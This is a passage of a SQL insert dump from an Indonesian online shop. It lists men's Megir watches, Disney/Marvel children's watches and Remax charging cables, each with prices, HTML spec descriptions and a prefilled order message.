(39,'Megir Bondi Original','Jam Pria Terlaris 2019','MegirBondi',313000,575000,95,NULL,'<h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\"><br>Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><div><br></div><div>• Item Type: Quartz Wristwatches</div><div>• Feature: Water Resistant,Complete Calendar,Chronograph</div><div>• Style: Sport</div><div>• Clasp Type: Buckle</div><div>• Case Thickness: 12mm</div><div>• Band Length: 23.5cm</div><div>• Brand Name: MEGIR</div><div>• Movement: Quartz</div><div>• Boxes &amp; Cases Material: Paper</div><div>• Dial Diameter: 48mm</div><div>• Band Width: 22mm</div><div>• Dial Window Material Type: Hardlex</div><div>• Band Material Type: Silicone</div><div>• Water Resistance Depth: 3Bar</div><div>• Case Material: Alloy</div><div>• Case Shape: Round</div><div>• Ethnic/Regional: Europe and America Asian</div><div>• Occasion: party outdoor casual anniversary</div><div>• Style: personalized exquisite</div><div>• Place of Origin: Zhejiang, China (Mainland)</div><div>• Property 1: High quality Quatz Movement</div><div>• Property 2: High abrasion resistant glass</div><div>• Property 3: Chronograph movement with calendar</div><div>• Gender: Men</div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 05:23:15',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Bondi'),
(40,'Megir Herro Original','Jam Pria Terlaris 2019','MegirHerro',390000,780000,87,NULL,'<h5><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\">Why We Love It !</span></div><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\"><br></span></div><div style=\"text-align: center;\"><span style=\"font-family: inherit; color: rgb(0, 0, 0);\">Karena setiap pria bermimpi memiliki arloji ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></div></h5><div style=\"text-align: center;\"><br></div><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 23cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Complete Calendar,Luminous Hands,Water Resistant,Chronograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 47mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 24mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 15mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Strap color: Blue, red, yellow</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion, sport</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band material: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Men Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Quartz watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function: Relogio Masculino</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 1: Business Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 2: Reloj Hombre</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 3: Montre Homme</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 4: Sport watch</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 08:16:13',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Megir Herro'),
(41,'Megir Kino Original','Jam Pria Terlaris 2019','MegirKino',375000,725000,95,NULL,'<h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\"><br>Karena setiap pria bermimpi memiliki arloji Sproty ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Sport</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 22cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Complete Calendar,Stop Watch,Chronograph</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 45.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 24mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 15.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion, sport, causal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Men Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Quartz watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function: Chronograph, date, time</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 1: Army Watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 2: Relogio Masculino</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 3: Military Watches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 4: Sport watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Gender: Men</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 08:32:18',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Kino'),
(42,'Megir Mali Original','Jam Pria Terlaris 2019','MegirMali',245000,585000,90,NULL,'<h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\">Why We Love It !</span></h5><h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\"><br><br>Karena setiap pria bermimpi memiliki arloji Sproty ELEGAN yang dapat mengekspresikan kepribadian mereka dan inilah pilihan terbaik untuk mewujudkan impian tersebut.</span></h5><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 22mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Complete Calendar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 43.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 22cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: MEGIR</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 11.5mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: PU</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color: Black, white</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band (strap) material: PU</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Type: Quartz watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Gender: Men, male, man</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item: Wrist watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 1: Watch men</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 2: Army watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 3: erkek kol saati</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 4: Sport watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature 5: Men watch</span></div><div><br></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 08:50:16',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Megir Mali'),
(43,'Jam Anak Marvel CA','Special Marvel Edition','MarvelCA',260000,599000,92,NULL,'<h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\">Jam Anak Edisi Marvel Ori</span></h5><h5 style=\"text-align: center;\"><span style=\"color: rgb(0, 0, 0);\"><br>Cocok Untuk Hadiah Anak, Yuk Pilih Karakter Kesukaan Sang Buah Hati...<br>Stok Terbatas !!!</span></h5><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">Brand: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">Case Diameter: 32 mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">Case Thickness: 7 mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">Band Width: 16 mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">Length: 21.2 cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">Movement: Japan quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">Color: Blue, Black</span></div><div><span style=\"color: rgb(0, 0, 0);\">Waterproof: 3 ATM / 30 meters</span></div><div><span style=\"color: rgb(0, 0, 0);\">Package: Gift box</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 09:13:48',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Marvel CA'),
(44,'Jam Anak Herro CA','Special Marvel Edition','HerroCA',268000,395000,89,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Water Resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Model Number: MV-81062</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: PU</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 14mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 25cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 8mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 31mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• COLOR: BLUE ,RED</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 09:26:02',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Herro CA'),
(45,'Jam Anak Edisi Captain America','Special Marvel Edition','CaptainAmerica',260000,395000,86,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Water Resistant,Luminous Hands</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: PU</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 16mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 21.6cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 13mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 35mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Watch colors: Blue,black,green</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Marvel: Avengers</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Best birthday gift: Children,boys</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Amazing watch: 3 ATM water resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Beautiful watch: Kids favorite wristwatch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Best wristwatch: High quality wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Stainless steel wristwatches: Leather strap watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Free shipping watches: Famous brand watches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Anolog wrist watch: Miyota quartz watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Hot sale wrist watches: Genuine Disney wristwatch</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 09:37:19',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Edisi Captain Ame'),
(46,'Jam Anak Edisi Super Herro','Special Marvel Edition','SuperHerro',338000,395000,80,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">HIGHLIGHTS</span></div><div><span style=\"color: rgb(0, 0, 0);\">Original Marvel Avengers</span></div><div><span style=\"color: rgb(0, 0, 0);\">Analog + Digital movement</span></div><div><span style=\"color: rgb(0, 0, 0);\">Date, time, alarm, stopwatch and backlight</span></div><div><span style=\"color: rgb(0, 0, 0);\">Matt rubber strap</span></div><div><span style=\"color: rgb(0, 0, 0);\">Water resistant 50m</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">MULTI-FUNCTION SPORTS WATCH</span></div><div><span style=\"color: rgb(0, 0, 0);\">Dilengkapi dengan fungsi jam, menit, detik, tanggal, bulan dan hari.#</span></div><div><span style=\"color: rgb(0, 0, 0);\">Alarm &amp; hourly chime</span></div><div><span style=\"color: rgb(0, 0, 0);\">12/24 hour display</span></div><div><span style=\"color: rgb(0, 0, 0);\">Fully automated calendar</span></div><div><span style=\"color: rgb(0, 0, 0);\">1/100 second timer</span></div><div><span style=\"color: rgb(0, 0, 0);\">EL Backlight</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 09:48:04',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Edisi Super Herro'),
(47,'Jam Anak Herro Red Edition','Special Marvel Edition','HerroRedEdition',268000,395000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Shock Resistant,Water Resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 14mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 19cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 7mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 32mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Paper</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 10:22:48',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Herro Red Edition'),
(48,'Jam Anak Avengers','Special Marvel Edition','Avengers',342000,750000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 20mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 22cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Glass</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 10mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Water Resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 43mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Item Type: Quartz Wristwatches</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Gender: Children</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 10:29:56',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Avengers'),
(49,'Jam Anak Captain A','Special Marvel Edition','CaptainA',318500,629000,95,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: simple</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Auto Date,Complete Calendar,Shock Resistant,Water Resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 20</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 22</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 10</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 40</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 10:43:35',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Captain A'),
(50,'Jam Anak Spiderman','Special Marvel Edition','Spiderman',268000,599000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Water Resistant,Luminous Hands</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Model Number: 81067</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: PU</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 14mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 21.2cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 8.8mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 32mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Watches Character : Black | Spiderman, Eye Spiderman, Spiderman</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 10:55:30',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Spiderman'),
(51,'Jam Anak Spider Edition','Special Marvel Edition','SpiderEdition',260000,450000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">• Movement: Quartz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Material: Alloy</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material Type: Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Shape: Round</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Water Resistance Depth: 3Bar</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Window Material Type: Hardlex</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Feature: Water Resistant</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style: Fashion &amp; Casual</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Clasp Type: Buckle</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dial Diameter: 28mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Length: 21cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name: Disney</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Width: 14mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Case Thickness: 7mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Boxes &amp; Cases Material: Metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">• kids watches: children wristwatch for boys</span></div><div><span style=\"color: rgb(0, 0, 0);\">• cartoon marvel watch: children wristwatch for boys</span></div><div><span style=\"color: rgb(0, 0, 0);\">• boys watches : boys watches children</span></div><div><span style=\"color: rgb(0, 0, 0);\">• student watch: children watch</span></div><div><span style=\"color: rgb(0, 0, 0);\">• children watch cartoon: children watches for boys</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Band Material : Leather</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color: Black / Blue</span></div><div><span style=\"color: rgb(0, 0, 0);\">• boys watches kids : watch for children boys</span></div><div><span style=\"color: rgb(0, 0, 0);\">• reloj infantil : relojes infantiles</span></div><div><span style=\"color: rgb(0, 0, 0);\">• montre enfant : montre enfant garcon</span></div><div><span style=\"color: rgb(0, 0, 0);\">• kinderhorloge : horloge kinderen</span></div><div><span style=\"color: rgb(0, 0, 0);\">• relogio infantil : relogio infantil relogio menino</span></div><div><span style=\"color: rgb(0, 0, 0);\">• zegarek dla dzieci : zegarek dziecko</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 11:03:36',NULL,NULL,'https://sanporium.com/product-category/jam-tangan/','6282283401530','Hai Min, Saya Mau Pesan Jam Anak Spider Edition'),
(52,'Cable Data Remax Ori 3 in 1','Remax Original Brand','CableDataRemaxOri3in1',79000,135000,80,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Cable Data Remax Ori 3 in 1 &amp; Charging Lesu series (Micro/Lightning/Type C)</span></div><div><span style=\"color: rgb(0, 0, 0);\">COLOR :&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">WHITE&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Features</span></div><div><span style=\"color: rgb(0, 0, 0);\">One Cable for All Your Device</span></div><div><span style=\"color: rgb(0, 0, 0);\">Berbeda dengan kabel biasa. kabel dari Remax ini dilengkapi dengan 3 port berbeda membuatnya bisa digunakan untuk perangkat yang berbeda - beda. Kehadiran port Lightning, USB Type-C dan Micro USB memastikan kompatibilitas yang tinggi untuk berbagai perangkat yang baru.&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">High Quality Material</span></div><div><span style=\"color: rgb(0, 0, 0);\">Material kabel yang kuat membuatnya tidak mudah putus sehingga dapat digunakan untuk waktu yang lama. Tidak hanya itu saja, kabel ini kompatibel dengan adapter charger 2.1A membuat Anda bisa mengisi daya perangkat dalam waktu singkat.&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Cute Design</span></div><div><span style=\"color: rgb(0, 0, 0);\">Desain kabel yang tidak agresif dan dipadukan dengan penggunaan warna pastel membuatnya terlihat sangat lucu saat digunakan oleh Anda.</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 11:35:41',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Cable Data Remax Ori 3 in'),
(53,'Remax Cable For Iphone Ori','Remax Original Brand','RemaxCableIphone',75000,87000,87,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Remax Cable For Iphone Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\">Kabel Remax Lightning USB untuk iPhone dengan lightning port hadir dengan design unik. Bentuk kabel yang rata membuat kabel ini awet dan tidak mudah kusut, disertai dengan bentuk ujung port yang ergonomis dibandingkan dengan USB biasa.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Features :</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Charging &amp; Sync Cable : Kabel ini dapat digunakan untuk mengisi baterai smartphone dan mentransfer data.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Flat Design : Design kabel yang rata membuat kabel ini tidak mudah kusut dan lebih awet.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Compatibility : Kabel Remax Metal Fast Charging ini dapat digunakan untuk semua smartphone yang menggunakan Lightning USB port.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Dimension Length : 100cm</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color : Black, White</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 11:44:24',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Remax Cable For Iphone Ori'),
